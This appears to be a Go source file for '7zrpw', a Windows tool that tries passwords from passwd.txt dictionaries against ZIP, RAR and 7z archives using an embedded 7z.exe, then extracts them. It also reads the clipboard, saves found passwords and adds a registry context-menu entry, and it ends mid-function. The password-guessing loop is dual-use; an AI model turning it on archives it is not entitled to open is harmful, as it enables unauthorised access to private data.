package main

import (
	"bufio"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	// 修改为正确的子包路径

	"crypto/md5"
	"encoding/hex"

	"syscall"
	"unsafe"

	"github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"
	"github.com/h2non/filetype"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	openClipboard    = user32.NewProc("OpenClipboard")
	closeClipboard   = user32.NewProc("CloseClipboard")
	getClipboardData = user32.NewProc("GetClipboardData")
	globalLock       = user32.NewProc("GlobalLock")
	globalUnlock     = user32.NewProc("GlobalUnlock")
	globalSize       = user32.NewProc("GlobalSize")
	rtlMoveMemory    = user32.NewProc("RtlMoveMemory")
)

// 添加调试开关
var debugMode bool = false

//go:embed resources/7z.exe
var sevenZipExe []byte

//go:embed resources/7z.dll
var sevenZipDll []byte

// 定义压缩文件的基本结构
type ArchiveEntry struct {
	Name      string
	CRC32     uint32
	Size      uint64
	Encrypted bool
}

// 定义常量和结构
const (
	// ZIP格式相关常量
	ZIP_LOCAL_HEADER_MAGIC   = 0x04034b50
	ZIP_CENTRAL_HEADER_MAGIC = 0x02014b50
	ZIP_END_HEADER_MAGIC     = 0x06054b50

	// 7Z格式相关常量
	SEVEN_ZIP_MAGIC = "7z\xBC\xAF\x27\x1C"

	VERSION = "v0.1.5.4"

	// 添加 Windows API 常量和函数声明
	WM_RBUTTONDOWN = 0x0204
	WM_RBUTTONUP   = 0x0205
	VK_CONTROL     = 0x11
	CF_TEXT        = 1
)

// 定义ZIP文件头结构
type ZipHeader struct {
	Magic       uint32
	Version     uint16
	Flags       uint16
	Method      uint16
	ModTime     uint16
	ModDate     uint16
	CRC32       uint32
	CompSize    uint32
	UncompSize  uint32
	NameLength  uint16
	ExtraLength uint16
}

// 支持的文件类型
const (
	TYPE_ZIP      = iota // .zip
	TYPE_RAR             // .rar
	TYPE_7Z              // .7z
	TYPE_ZIP_PART        // .zip.001, .z01 等分卷
	TYPE_RAR_PART        // .part1.rar, .r01 等分卷
	TYPE_7Z_PART         // .7z.001 等分卷
	TYPE_GZ              // .gz, .tar.gz, .tgz
	TYPE_BZ2             // .bz2, .tar.bz2, .tbz2
	TYPE_TAR             // .tar
	TYPE_TAR_PART        // .tar.001, .tar.002 等分卷
	TYPE_XZ              // .xz, .tar.xz, .txz
	TYPE_CAB             // .cab
	TYPE_ISO             // .iso
	TYPE_ARJ             // .arj
	TYPE_LZH             // .lzh, .lha
	TYPE_WIM             // .wim, .swm (分段 WIM)
)

// 版本信息结构
type VersionInfo struct {
	Version     string `json:"version"`
	DownloadURL string `json:"download_url"`
	ReleaseNote string `json:"release_note"`
	MD5         string `json:"md5"`
	ForceUpdate bool   `json:"force_update"` // 确保字段名完全匹配
}

// 辅助函数：仅在文件不存在时提取文件
func extractFileIfNotExist(path string, data []byte) error {
	// 检查文件是否存在
	if _, err := os.Stat(path); os.IsNotExist(err) {
		// 文件不存在时才写入
		return os.WriteFile(path, data, 0755)
	}
	return nil // 文件已存在，不需要操作
}

// 在 init() 函数中添加配置文件初始化
// 感谢https://github.com/ShuiJu 的提点，7z.exe和7z.dll需要时才进行释放，预加载user32.dll

func init() {
	tempDir := filepath.Join(os.TempDir(), "7zrpw")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		panic(fmt.Sprintf("无法创建临时目录: %v", err))
	}

	sevenZipPath := filepath.Join(tempDir, "7z.exe")
	dllPath := filepath.Join(tempDir, "7z.dll")

	// 提取必要文件
	if err := extractFileIfNotExist(sevenZipPath, sevenZipExe); err != nil {
		panic(fmt.Sprintf("无法释放7z.exe: %v", err))
	}

	if err := extractFileIfNotExist(dllPath, sevenZipDll); err != nil {
		panic(fmt.Sprintf("无法释放7z.dll: %v", err))
	}

	// 预加载 DLL
	if err := user32.Load(); err != nil {
		panic(fmt.Sprintf("无法加载user32.dll: %v", err))
	}
}

// 获取7z.exe路径
// 说明：获取7z.exe路径
// 返回：7z.exe路径
func getSevenZipPath() string {
	return filepath.Join(os.TempDir(), "7zrpw", "7z.exe")
}

// 函数说明：GBK解码
// 参数：
// s: 需要解码的字符串
// 返回：解码后的字符串
func decodeGBK(s string) string {
	// 如果字符串已经是UTF-8，直接返回
	if utf8.ValidString(s) {
		return s
	}

	// 尝试GBK解码
	reader := transform.NewReader(strings.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := io.ReadAll(reader)
	if e != nil {
		return s
	}
	return string(d)
}

// 函数说明：获取文件类型
// 参数：
// path: 文件路径
// 返回：文件类型
func getFileType(path string) int {
	// 1. 首先检查分卷格式（通过文件名）
	baseName := strings.ToLower(filepath.Base(path))

	// 检查7z分卷（支持任意序号）
	if matched, _ := regexp.MatchString(`\.7z\.\d{3}$`, baseName); matched {
		return TYPE_7Z_PART
	}

	if strings.Contains(baseName, ".zip.") || strings.HasSuffix(baseName, ".z01") {
		return TYPE_ZIP_PART
	}
	if strings.Contains(baseName, ".part") && strings.HasSuffix(baseName, ".rar") ||
		strings.HasSuffix(baseName, ".r01") {
		return TYPE_RAR_PART
	}
	if matched, _ := regexp.MatchString(`\.tar\.\d{3}$`, baseName); matched {
		return TYPE_TAR_PART
	}

	// 2. 读取文件头（只读取前 8KB）
	file, err := os.Open(path)
	if err != nil {
		return -1
	}
	defer file.Close()

	// 只读取文件头部分
	header := make([]byte, 8192)
	n, err := file.Read(header)
	if err != nil && err != io.EOF {
		return -1
	}
	header = header[:n]

	// 使用 filetype 库检测文件类型
	kind, err := filetype.Match(header)
	if err == nil && kind != filetype.Unknown {
		switch kind.MIME.Value {
		case "application/zip":
			return TYPE_ZIP
		case "application/x-rar-compressed":
			return TYPE_RAR
		case "application/x-7z-compressed":
			return TYPE_7Z
		case "application/gzip":
			return TYPE_GZ
		case "application/x-bzip2":
			return TYPE_BZ2
		case "application/x-tar":
			return TYPE_TAR
		case "application/x-xz":
			return TYPE_XZ
		case "application/vnd.ms-cab-compressed":
			return TYPE_CAB
		case "application/x-iso9660-image":
			return TYPE_ISO
		}
	}

	// 3. 如果文件类型检测失败，回退到扩展名检测
	ext := strings.ToLower(filepath.Ext(path))
	switch ext {
	case ".zip":
		return TYPE_ZIP
	case ".rar":
		return TYPE_RAR
	case ".7z":
		return TYPE_7Z
	case ".gz", ".tgz":
		return TYPE_GZ
	case ".bz2", ".tbz2":
		return TYPE_BZ2
	case ".tar":
		return TYPE_TAR
	case ".xz", ".txz":
		return TYPE_XZ
	case ".cab":
		return TYPE_CAB
	case ".iso":
		return TYPE_ISO
	case ".arj":
		return TYPE_ARJ
	case ".lzh", ".lha":
		return TYPE_LZH
	case ".wim", ".swm":
		return TYPE_WIM
	}

	// 4. 检查特殊格式
	if strings.HasSuffix(baseName, ".tar.gz") {
		return TYPE_GZ
	}
	if strings.HasSuffix(baseName, ".tar.bz2") {
		return TYPE_BZ2
	}
	if strings.HasSuffix(baseName, ".tar.xz") {
		return TYPE_XZ
	}

	return -1
}

// 函数说明：判断是否需要密码
// 参数：
// fileType: 文件类型
// 返回：是否需要密码
func isPasswordRequired(fileType int) bool {
	switch fileType {
	case TYPE_ZIP, TYPE_ZIP_PART,
		TYPE_RAR, TYPE_RAR_PART,
		TYPE_7Z,
		TYPE_ARJ,
		TYPE_LZH:
		return true
	case TYPE_TAR, TYPE_TAR_PART,
		TYPE_GZ,
		TYPE_BZ2,
		TYPE_XZ,
		TYPE_ISO,
		TYPE_WIM,
		TYPE_CAB:
		return false
	default:
		return true // 未知格式默认需要密码
	}
}

/*
*
函数说明：测试密码
参数：
archivePath: 压缩文件路径
password: 密码
返回：是否成功
*/
func testPassword(archivePath, password string) bool {
	// 构建测试命令，使用7z的t命令测试文件完整性，来判断密码是否正确
	args := []string{
		"t",
		"-p" + password,
		archivePath,
	}

	cmd := exec.Command(getSevenZipPath(), args...)
	cmd.Env = append(os.Environ(), "LANG=C.UTF-8")

	resultChan := make(chan bool, 1)

	go func() {
		output, _ := cmd.CombinedOutput()
		outputStr := string(output)
		//fmt.Printf("测试密码输出: %s\n", outputStr)

		// 如果输出包含以下信息，说明密码正确
		if strings.Contains(outputStr, "Everything is Ok") {
			resultChan <- true
			return
		}

		// 如果输出包含以下错误信息，说明密码错误
		if strings.Contains(outputStr, "Cannot open encrypted archive") ||
			strings.Contains(outputStr, "Data Error in encrypted file") ||
			strings.Contains(outputStr, "ERROR:") ||
			strings.Contains(outputStr, "Can't open as archive") ||
			strings.Contains(outputStr, "ERROR: Wrong password") ||
			strings.Contains(outputStr, "Wrong password") ||
			strings.Contains(outputStr, "Archives with Errors") {
			resultChan <- false
			return
		}

		resultChan <- true
	}()

	// 等待结果或超时
	select {
	case result := <-resultChan: // 获取结果
		return result // 返回结果
	case <-time.After(2 * time.Second):
		// 2秒内没有错误标记，说明是正确密码
		// 确保检查大文件时，7z.exe会一直检查整个文件直至检查结束。
		//当大于2秒时，基本可以认为密码正确
		cmd.Process.Kill() // 强制终止命令
		return true        // 返回true
	}
}

// 函数说明：格式化进度显示
// 参数：
// current: 当前尝试的密码数量
// total: 总的密码数量
// currentPass: 当前尝试的密码
// 返回：格式化后的进度显示字符串
func formatProgress(current, total int, currentPass string) string {
	percent := float64(current) * 100.0 / float64(total)

	// 使用已有的 decodeGBK 函数处理密码字符串
	cleanPass := decodeGBK(currentPass)

	// 先清除整行，再显示新内容
	return fmt.Sprintf("\r%s\r正在尝试密码... %d/%d （%.1f%%） [%s]",
		strings.Repeat(" ", 100), // 清除整行
		current,
		total,
		percent,
		cleanPass)
}

// 函数说明：破解压缩文件
// 参数：
// archivePath: 压缩文件路径
// passwords: 密码列表
// 返回：密码，错误信息
func crackArchive(archivePath string, passwords []string) (string, error) {
	startTime := time.Now() // 记录开始时间

	// 首先尝试空密码
	if testPassword(archivePath, "") {
		elapsed := time.Since(startTime)
		fmt.Printf("\n破解用时: %s\n", formatDuration(elapsed))
		return "", nil
	}

	// 记录已尝试的密码数量
	testedCount := 0

	// 逐个尝试密码
	for i, pass := range passwords {
		testedCount++
		// 显示进度条
		fmt.Print(formatProgress(i+1, len(passwords), pass))

		// 测试密码
		if testPassword(archivePath, pass) {
			elapsed := time.Since(startTime)
			speed := float64(testedCount) / elapsed.Seconds()
			fmt.Printf("\n破解用时: %s (平均 %.1f 密码/秒)\n", formatDuration(elapsed), speed)
			return pass, nil
		}
	}

	elapsed := time.Since(startTime)
	speed := float64(testedCount) / elapsed.Seconds()
	fmt.Printf("\n破解用时: %s (平均 %.1f 密码/秒)\n", formatDuration(elapsed), speed)
	return "", fmt.Errorf("未找到正确密码")
}

// 函数说明：处理解压文件
// 参数：
// archivePath: 压缩文件路径
// extractPath: 解压路径
// password: 密码
// isFound: 是否找到密码
func handleExtract(archivePath string, extractPath string, password string, isFound bool) {
	if isFound {
		if password == "" {
			fmt.Println("\n文件无密码")
		} else {
			fmt.Printf("\n找到正确密码: [%s]\n", password)
		}
	} else {
		fmt.Printf("\n密码正确: [%s]\n", password)
	}

	fmt.Println("正在解压文件...")
	if err := extractArchive(archivePath, password, extractPath); err != nil {
		fmt.Printf("解压失败: %v\n", err)
	} else {
		fmt.Printf("\n解压成功！\n")
		fmt.Printf("文件已保存到: %s\n", formatPath(extractPath))
	}
}

// 函数说明：获取第一个分卷的路径
// 参数：
// archivePath: 压缩文件路径
// 返回：第一个分卷的路径，错误信息
func getFirstVolumePath(archivePath string) (string, error) {
	baseName := filepath.Base(archivePath)
	baseDir := filepath.Dir(archivePath)

	// 7Z 分卷 (.7z.001, .7z.002, ...)
	if matched, _ := regexp.MatchString(`\.7z\.\d{3}$`, baseName); matched {
		baseFile := baseName[:len(baseName)-7] // 移除 .7z.NNN
		return filepath.Join(baseDir, baseFile+".7z.001"), nil
	}

	// ZIP 分卷格式1 (.zip.001, .zip.002, ...)
	if matched, _ := regexp.MatchString(`\.zip\.\d{3}$`, baseName); matched {
		baseFile := baseName[:len(baseName)-8] // 移除 .zip.NNN
		firstPart := filepath.Join(baseDir, baseFile+".zip.001")
		if _, err := os.Stat(firstPart); err == nil {
			return firstPart, nil
		}
	}

	// ZIP 分卷格式2 (.zip, .z01, .z02, ...)
	if matched, _ := regexp.MatchString(`\.z\d{2}$`, baseName); matched {
		baseFile := baseName[:len(baseName)-4] // 移除 .zNN
		firstPart := filepath.Join(baseDir, baseFile+".zip")
		if _, err := os.Stat(firstPart); err == nil {
			return firstPart, nil
		}
	}

	// RAR 分卷 (.part1.rar, .part2.rar, ...)
	if matched, _ := regexp.MatchString(`\.part\d+\.rar$`, baseName); matched {
		baseFile := strings.Split(baseName, ".part")[0]
		return filepath.Join(baseDir, baseFile+".part1.rar"), nil
	}

	// RAR 旧格式分卷 (.r01, .r02, ...)
	if matched, _ := regexp.MatchString(`\.r\d{2}$`, baseName); matched {
		baseFile := baseName[:len(baseName)-4] // 移除 .rNN
		return filepath.Join(baseDir, baseFile+".rar"), nil
	}

	// 如果是 .zip 文件，检查是否是分卷的主文件
	if strings.HasSuffix(baseName, ".zip") {
		// 检查是否存在 .z01 文件
		baseFile := baseName[:len(baseName)-4] // 移除 .zip
		z01File := filepath.Join(baseDir, baseFile+".z01")
		if _, err := os.Stat(z01File); err == nil {
			return archivePath, nil // 这是分卷的主文件
		}
	}

	// 如果不是分卷，返回原始路径
	return archivePath, nil
}

// 函数说明：解压函数
// 参数：
// archivePath: 压缩文件路径
// password: 密码
// extractPath: 解压路径
// 返回：错误信息
func extractArchive(archivePath string, password string, extractPath string) error {

	// 如果解压目录不存在，则创建解压目录
	if _, err := os.Stat(extractPath); os.IsNotExist(err) { // 如果解压目录不存在
		if err := os.MkdirAll(extractPath, 0755); err != nil { // 创建解压目录
			return fmt.Errorf("创建解压目录失败: %v", err) //
		}
	}

	sevenZPath := getSevenZipPath()

	args := []string{
		"x",
		"-y",
		fmt.Sprintf("-p%s", password),
		fmt.Sprintf("-o%s", extractPath),
		archivePath,
	}

	cmd := exec.Command(sevenZPath, args...)
	done := make(chan bool)
	startTime := time.Now()

	// 启动进度显示
	go func() {
		for {
			select {
			case <-done:
				return
			default:
				elapsed := time.Since(startTime)
				fmt.Printf("\r解压中，请稍等... 已用时: %s", formatDuration(elapsed))
				time.Sleep(time.Second)
			}
		}
	}()

	// 执行命令
	err := cmd.Run()

	// 停止进度显示
	done <- true
	fmt.Println()

	// 显示总用时
	totalTime := time.Since(startTime)
	fmt.Printf("\n解压完成，总用时: %s\n", formatDuration(totalTime))
	reportPassword(archivePath, password)

	if err != nil {
		return fmt.Errorf("解压失败: %v", err)
	}

	return nil
}

// 函数说明：格式化持续时间
// 参数：
// d: 持续时间
// 返回：格式化后的持续时间字符串
func formatDuration(d time.Duration) string {
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	d -= m * time.Minute
	s := d / time.Second

	if h > 0 {
		return fmt.Sprintf("%d时%02d分%02d秒", h, m, s)
	}
	if m > 0 {
		return fmt.Sprintf("%d分%02d秒", m, s)
	}
	return fmt.Sprintf("%d秒", s)
}

// 函数说明：查找压缩文件
// 参数：
// dir: 目录路径
// 返回：压缩文件列表
func findCompressFiles(dir string) []string {
	var files []string
	entries, err := os.ReadDir(dir)
	if err != nil {
		return files
	}

	// 定义常见压缩文件扩展名
	extensions := []string{
		".zip", ".rar", ".7z",
		".gz", ".tgz", ".tar.gz",
		".bz2", ".tbz2", ".tar.bz2",
		".tar", ".xz", ".txz", ".tar.xz",
		".cab", ".iso", ".arj",
		".lzh", ".lha",
	}

	// 检查分卷格式的正则表达式
	partPatterns := []string{
		`\.zip\.\d+$`, `\.z\d{2}$`,
		`\.part\d+\.rar$`, `\.r\d{2}$`,
		`\.7z\.\d+$`,
		`\.tar\.\d{3}$`, // 添加对 .tar.001 等分卷的支持
	}

	// 分别存储压缩文件和目录
	var compressFiles []string
	var directories []string

	for _, entry := range entries {
		// 获取原始文件名
		rawName := entry.Name()

		// 尝试解码
		decodedName := decodeGBK(rawName)

		// 用于匹配的小写名称
		lowerName := strings.ToLower(decodedName)

		if entry.IsDir() {
			directories = append(directories, decodedName+"/")
			continue
		}

		// 检查是否是压缩文件
		isCompressFile := false

		// 检查常规扩展名
		for _, ext := range extensions {
			if strings.HasSuffix(lowerName, ext) {
				compressFiles = append(compressFiles, decodedName)
				isCompressFile = true
				break
			}
		}

		// 如果不是常规压缩文件，检查分卷格式
		if !isCompressFile {
			for _, pattern := range partPatterns {
				matched, _ := regexp.MatchString(pattern, lowerName)
				if matched {
					compressFiles = append(compressFiles, decodedName)
					break
				}
			}
		}
	}

	// 分别排序
	sort.Strings(compressFiles)
	sort.Strings(directories)

	// 按顺序合并：压缩文件在前，目录在后
	files = append(files, compressFiles...)
	files = append(files, directories...)

	return files
}

// 定义文件大小阈值(10MB)
const FILE_SIZE_THRESHOLD = 10 * 1024 * 1024

// 函数说明：读取密码文件
// 参数：
// path: 密码文件路径
// 返回：密码列表，密码数量，错误信息
func readPasswordFile(path string) ([]string, int, error) {
	// 获取文件信息和大小
	fileInfo, err := os.Stat(path)
	if err != nil {
		return nil, 0, fmt.Errorf("获取文件信息失败: %v", err)
	}

	fileSize := fileInfo.Size()

	if fileSize <= FILE_SIZE_THRESHOLD {
		// 小文件使用简单方式
		return readSmallFile(path)
	} else {
		// 大文件使用channel方式
		return readLargeFile(path)
	}
}

// 读取小文件
func readSmallFile(path string) ([]string, int, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, 0, err
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)

	// 优化: 设置更大的buffer以提高读取性能
	const maxCapacity = 512 * 1024 // 512KB
	buf := make([]byte, maxCapacity)
	scanner.Buffer(buf, maxCapacity)

	for scanner.Scan() {
		if password := strings.TrimSpace(scanner.Text()); password != "" {
			passwords = append(passwords, password)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, 0, fmt.Errorf("读取文件失败: %v", err)
	}

	return passwords, len(passwords), nil
}

// 读取大文件
func readLargeFile(path string) ([]string, int, error) {
	// 创建结果channel
	resultChan := make(chan []string)
	errorChan := make(chan error)

	// 启动goroutine读取文件
	go func() {
		file, err := os.Open(path)
		if err != nil {
			errorChan <- err
			return
		}
		defer file.Close()

		var passwords []string
		scanner := bufio.NewScanner(file)

		// 优化: 设置更大的buffer以提高读取性能
		const maxCapacity = 512 * 1024 // 512KB
		buf := make([]byte, maxCapacity)
		scanner.Buffer(buf, maxCapacity)

		for scanner.Scan() {
			if password := strings.TrimSpace(scanner.Text()); password != "" {
				passwords = append(passwords, password)
			}
		}

		if err := scanner.Err(); err != nil {
			errorChan <- fmt.Errorf("读取文件失败: %v", err)
			return
		}

		resultChan <- passwords
	}()

	// 等待结果
	select {
	case passwords := <-resultChan:
		return passwords, len(passwords), nil
	case err := <-errorChan:
		return nil, 0, err
	case <-time.After(30 * time.Second): // 添加超时处理
		return nil, 0, fmt.Errorf("读取文件超时")
	}
}

// 函数说明：获取所有密码
func getAllPasswords() ([]string, string, error) {
	// 获取可能的密码文件路径
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	currentDir, _ := os.Getwd()

	// 按优先级顺序存储密码文件路径
	dictPaths := []string{
		filepath.Join(currentDir, "passwd.txt"), // 当前目录
		filepath.Join(exeDir, "passwd.txt"),     // 程序目录
	}

	// 对路径进行去重
	var uniquePaths []string
	seen := make(map[string]bool)

	for _, path := range dictPaths {
		absPath, err := filepath.Abs(path)
		if err != nil {
			continue
		}
		if !seen[absPath] {
			seen[absPath] = true
			uniquePaths = append(uniquePaths, path)
		}
	}

	// 用map去重
	passwordMap := make(map[string]bool)
	var usedPaths []string
	filePasswords := make(map[string]int)

	// 读取所有密码文件
	for _, path := range uniquePaths {
		if passwords, count, err := readPasswordFile(path); err == nil {
			if count > 0 {
				usedPaths = append(usedPaths, path)
				filePasswords[path] = count
				// 添加密码到map中去重
				for _, password := range passwords {
					passwordMap[password] = true
				}
			}
		}
	}

	// 如果没有找到任何密码
	if len(passwordMap) == 0 {
		return nil, "", fmt.Errorf("未找到密码文件或密码为空")
	}

	// 转换map为切片
	var uniquePasswords []string
	for pass := range passwordMap {
		uniquePasswords = append(uniquePasswords, pass)
	}

	// 生成使用的密码文件信息
	var usedPathsInfo string
	if len(usedPaths) > 0 {
		usedPathsInfo = "使用的密码文件:\n"
		for i, path := range usedPaths {
			usedPathsInfo += fmt.Sprintf("%d. %s (包含 %d 个密码)\n", i+1, path, filePasswords[path])
		}
		usedPathsInfo += fmt.Sprintf("\n去重后共 %d 个密码", len(uniquePasswords))
	}

	return uniquePasswords, usedPathsInfo, nil
}

// 函数说明：获取文件类型描述
// 参数：
// fileType: 文件类型
// 返回：文件类型描述
func getFileTypeDesc(fileType int) string {
	switch fileType {
	case TYPE_ZIP:
		return "ZIP 压缩文件"
	case TYPE_RAR:
		return "RAR 压缩文件"
	case TYPE_7Z:
		return "7Z 压缩文件"
	case TYPE_ZIP_PART:
		return "ZIP 分卷压缩文件"
	case TYPE_RAR_PART:
		return "RAR 分卷压缩文件"
	case TYPE_7Z_PART:
		return "7Z 分卷压缩文件"
	case TYPE_GZ:
		return "GZIP 压缩文件"
	case TYPE_BZ2:
		return "BZIP2 压缩文件"
	case TYPE_TAR:
		return "TAR 归档文件"
	case TYPE_TAR_PART:
		return "TAR 分卷归档文件"
	case TYPE_XZ:
		return "XZ 压缩文件"
	case TYPE_CAB:
		return "CAB 压缩文件"
	case TYPE_ISO:
		return "ISO 镜像文件"
	case TYPE_ARJ:
		return "ARJ 压缩文件"
	case TYPE_LZH:
		return "LZH 压缩文件"
	case TYPE_WIM:
		return "WIM 映像文件"
	default:
		return "未知文件类型"
	}
}

// 函数说明：格式化文件大小
// 参数：
// size: 文件大小
// 返回：文件大小描述
func formatFileSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

// 函数说明：获取默认解压路径（去掉扩展名和分卷标识）
// 参数：
// archivePath: 压缩文件路径
// 返回：解压路径
func getDefaultExtractPath(archivePath string) string {
	// 获取文件名（不含扩展名）
	baseName := filepath.Base(archivePath)
	ext := filepath.Ext(baseName)
	nameWithoutExt := strings.TrimSuffix(baseName, ext)

	// 如果是分卷文件，去除分卷标识
	switch {
	case strings.HasSuffix(nameWithoutExt, ".7z"):
		nameWithoutExt = strings.TrimSuffix(nameWithoutExt, ".7z")
	case strings.HasSuffix(nameWithoutExt, ".zip"):
		nameWithoutExt = strings.TrimSuffix(nameWithoutExt, ".zip")
	case strings.HasSuffix(nameWithoutExt, ".rar"):
		nameWithoutExt = strings.TrimSuffix(nameWithoutExt, ".rar")
	}

	// RAR分卷去除分卷标识（如 .part1, .part2 等）
	if idx := strings.LastIndex(nameWithoutExt, ".part"); idx != -1 {
		nameWithoutExt = nameWithoutExt[:idx]
	}

	// 返回解压目录名
	return filepath.Join(filepath.Dir(archivePath), nameWithoutExt)
}

// 函数说明：格式化路径显示
// 参数：
// path: 路径
// 返回：格式化后的路径
func formatPath(path string) string {
	absPath, err := filepath.Abs(path)
	if err != nil {
		return fmt.Sprintf("%s (无法获取完整路径)", path)
	}
	return absPath
}

// 函数说明：保存密码到passwd.txt文件
// 参数：
// password: 密码
// 返回：错误信息
func savePasswordToFile(password string) error {
	// 获取程序路径
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取程序路径失败: %v", err)
	}

	// 构建密码文件路径
	passwdPath := filepath.Join(filepath.Dir(exePath), "passwd.txt")

	// 检查密码是否已存在
	content, err := os.ReadFile(passwdPath)
	if err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("读取密码文件失败: %v", err)
	}

	// 检查密码是否已存在
	if strings.Contains(string(content), password) {
		return nil
	}

	// 以追加模式打开文件
	f, err := os.OpenFile(passwdPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("打开密码文件失败: %v", err)
	}
	defer f.Close()

	// 如果文件不为空且最后一个字符不是换行符，先写入换行符
	if len(content) > 0 && !strings.HasSuffix(string(content), "\n") {
		if _, err := f.WriteString("\n"); err != nil {
			return fmt.Errorf("写入换行符失败: %v", err)
		}
	}

	// 只追加新密码
	if _, err := f.WriteString(password + "\n"); err != nil {
		return fmt.Errorf("写入密码失败: %v", err)
	}

	return nil
}

// 处理密码破解失败的情况
// 参数：
// archivePath: 压缩文件路径
// extractPath: 解压路径
func handleCrackFailed(archivePath string, extractPath string) {
	fmt.Println("\n密码破解失败！")

	for {
		fmt.Print("请输入新的密码，右键直接粘贴(直接回车退出): ")
		var password string

		// 检测右键点击
		state, _, _ := getAsyncKeyState.Call(uintptr(VK_CONTROL))
		if state&0x8000 != 0 {
			// 如果按下了 Ctrl，等待右键点击
			time.Sleep(100 * time.Millisecond)
			state, _, _ = getAsyncKeyState.Call(uintptr(WM_RBUTTONDOWN))
			if state&0x8000 != 0 {
				// 获取剪贴板内容
				password = getClipboardText()
				fmt.Println(password) // 显示粘贴的内容
			}
		} else {
			// 普通输入
			fmt.Scanln(&password)
		}

		if password == "" {
			return
		}

		if testPassword(archivePath, password) {
			handleExtract(archivePath, extractPath, password, true)
			//保存密码到passwd.txt文件
			if err := savePasswordToFile(password); err != nil {
				fmt.Printf("保存密码失败: %v\n", err)
			} else {
				fmt.Printf("新密码【%s】已保存到passwd.txt文件。 \n", password)
			}
			return
		} else {
			fmt.Println("\n密码错误！请重试或回车退出")
		}
	}
}

//	函数说明：处理压缩文件
//
// 参数：
// archivePath: 压缩文件路径
// passwords: 密码列表
// passwordsInfo: 使用的密码文件信息
func processArchive(archivePath string, passwords []string, passwordsInfo string) {
	// 获取文件信息
	fileInfo, err := os.Stat(archivePath)
	if err != nil {
		fmt.Printf("无法获取文件信息: %v\n", err)
		return
	}

	fmt.Printf("正在处理文件: %s\n", formatPath(archivePath))
	fmt.Printf("文件大小: %s\n", formatFileSize(fileInfo.Size()))

	// 检查文件类型并显示
	fileType := getFileType(archivePath)
	fmt.Printf("文件类型: %s\n", getFileTypeDesc(fileType))

	// 获取解压路径
	extractPath := getDefaultExtractPath(archivePath)

	// 获取第一个分卷
	firstVolume, err := getFirstVolumePath(archivePath)
	if err != nil {
		fmt.Printf("\n%v\n", err)
		return
	}

	if firstVolume != archivePath {
		fmt.Printf("使用第一个分卷: %s\n", firstVolume)
		archivePath = firstVolume
	}

	// 检查是否需要密码
	if !isPasswordRequired(fileType) {
		fmt.Println("检测到无需密码的文件格式，直接解压...")
		if err := extractArchive(archivePath, "", extractPath); err != nil {
			fmt.Printf("解压失败: %v\n", err)
		} else {
			fmt.Printf("\n解压成功！\n")
			fmt.Printf("文件已保存到: %s\n", formatPath(extractPath))
		}
		return
	}

	// 需要密码的文件处理逻辑
	if len(passwords) > 0 {
		fmt.Println(passwordsInfo)
	}
	fmt.Println("\n开始尝试破解...")

	// 尝试使用找到的密码解压
	if foundPassword, err := crackArchive(archivePath, passwords); err == nil {
		handleExtract(archivePath, extractPath, foundPassword, true)
	} else {
		handleCrackFailed(archivePath, extractPath)
	}
}

// clearScreen 清除屏幕内容
func clearScreen() {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	default: // linux, darwin, etc
		fmt.Print("\033[H\033[2J") // ANSI 转义序列清屏
	}
	fmt.Printf("---------------------------------------------------------------------\n")
	fmt.Printf("欢迎使用 7zrpw 解压助手 %s\n", VERSION)
	fmt.Printf("BY:hillghost86 \n")
	fmt.Printf("https://github.com/hillghost86/7zrpw\n")
	fmt.Printf("---------------------------------------------------------------------\n")
	if debugMode {
		fmt.Println("debugMode: ", debugMode)
	}
}

// 函数说明：安装右键菜单
// 返回：错误信息
func installContext() error {
	// 获取程序路径
	exe, err := os.Executable()
	if err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 安装失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("获取程序路径失败: %v\n", err)
		fmt.Println("右键菜单安装失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("获取程序路径失败: %v", err)
	}
	exePath := strings.ReplaceAll(exe, "/", "\\")

	// 创建注册表项
	k, _, err := registry.CreateKey(
		registry.CLASSES_ROOT,
		`*\shell\7zrpw`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 安装失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("创建注册表项失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单安装失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("创建注册表项失败: %v \n请以【管理员身份运行】后重试。", err)
	}
	defer k.Close()

	// 设置显示名称和图标
	if err := k.SetStringValue("", "使用7zrpw解压"); err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 安装失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("设置显示名称失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单安装失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("设置显示名称失败: %v \n请以【管理员身份运行】后重试。", err)
	}
